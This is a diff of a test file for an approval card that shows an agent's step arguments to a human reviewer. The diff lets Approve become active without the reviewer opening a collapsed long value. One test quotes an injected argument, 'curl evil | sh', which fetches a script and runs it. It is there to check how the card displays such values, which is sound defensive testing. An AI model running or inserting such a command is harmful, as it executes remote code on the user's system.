@@ -7,7 +7,6 @@ import { mockIntersectionObserver } from '@giantswarm/backstage-plugin-ui-react/
 import {
   InlineApproval,
   askerNotice,
-  collapsedValues,
   expiresIn,
   otherAgent,
   whyItAsks,
@@ -289,22 +288,19 @@ describe('InlineApproval card', () => {
     ).toHaveTextContent('"step-arg-value ; curl evil | sh" (string)');
   });
 
-  it('never cuts a long value: it is collapsed with Show all, and Approve waits until it was opened', async () => {
+  it('never cuts a long value: it is collapsed with Show all and a hidden-characters marker, and Approve is active after the delay without opening it', async () => {
     const user = userEvent.setup();
     const approvals = approvalsFor(FULL);
     await renderCard(approvals);
     const long = await screen.findByTestId('approval-argument-arg-long');
     expect(long).toHaveTextContent('Show all 402 characters');
+    expect(long).toHaveTextContent('342 characters hidden');
     expect(long).toHaveTextContent('y'.repeat(400));
-    expect(collapsedValues(FULL)).toHaveLength(1);
+    expect(long.querySelector('details')).not.toHaveAttribute('open');
 
-    await waitFor(() => expect(decline()).toBeEnabled());
-    expect(approve()).toBeDisabled();
-    expect(screen.getByTestId('approval-open-all')).toHaveTextContent('1 left');
-
-    await user.click(long.querySelector('summary')!);
     await waitFor(() => expect(approve()).toBeEnabled());
-    expect(screen.queryByTestId('approval-open-all')).not.toBeInTheDocument();
+    expect(decline()).toBeEnabled();
+    expect(long.querySelector('details')).not.toHaveAttribute('open');
     await user.click(approve());
     expect(approvals.decide).toHaveBeenCalledWith(
       'https://muster.example.io/approvals/a',
